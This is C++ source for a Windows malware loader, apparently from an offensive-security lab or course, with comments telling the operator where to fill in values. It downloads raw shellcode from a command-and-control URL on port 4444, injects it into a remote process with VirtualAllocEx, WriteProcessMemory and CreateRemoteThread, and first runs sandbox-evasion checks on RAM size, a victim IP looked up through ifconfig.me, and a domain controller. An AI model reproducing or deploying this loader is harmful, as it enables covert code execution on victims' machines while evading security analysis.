#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")
#include <lm.h>
#include <lmaccess.h>
#include <lmapibuf.h>
#pragma comment(lib, "netapi32.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = 509;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 123456);
//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://192.168.147.250:4444/index.raw";
    IStream* stream;
//Update the buff[] variable to include your shellcode size
    char buff[509];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
//Update the Read file descriptor to include your shellcode size
        stream->Read(buff, 509, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

BOOL memoryCheck() {
// This function will check and see if the system has 5+GB of RAM
// Declare the MEMORYSTATUSEX Struct    
    MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct    
    statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
    GlobalMemoryStatusEx(&statex);
// Checks if the System Memory is greater than 5.00GB    
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {        
       return TRUE;    
    } else {        
       return FALSE;
    }
}

BOOL checkIP() {   
 // Declare the Website URL that we would like to visit
    const char* websiteURL = "<https://ifconfig.me/ip>";   
 // Create an Internet Stream to access the website
    IStream* stream;   
 // Create a string variable where we will store the string data received from the website
    string s;   
  // Create a space in memory where we will store our IP Address
    char buff[35];   
    unsigned long bytesRead;   
 // Open an Internet stream to the remote website
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);   
 // While data is being sent from the webserver, write it to memory
    while (true) {       
        stream->Read(buff, 35, &bytesRead);       
        if (0U == bytesRead) {           
            break;       
        }       
        s.append(buff, bytesRead);   
    }   
  // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.
    if (s == "VICTIM_IP") {       
        return TRUE;   
    }   
    else {       
    return FALSE;   
    }
} 

BOOL isDomainController(){
// Create a long pointer to Wide String for our DC Name to live in
    LPCWSTR dcName;  
// Query the NetGetDCName Win32 API for the Domain Controller Name
    NetGetDCName(NULL, NULL, (LPBYTE *) &dcName);
// Convert the DCName from a Wide String to a String
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
//  Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail.
    if (dcNewName.find("\\\\") != std::string::npos) {
          return TRUE;
    } else {
          return FALSE;
    }
} 


int main() {
    Sleep(60000);
    if (isDomainController() && memoryCheck() && checkIP()) {
        downloadAndExecute();
    } else {
        cout << "Itssndbox";
    }
} 
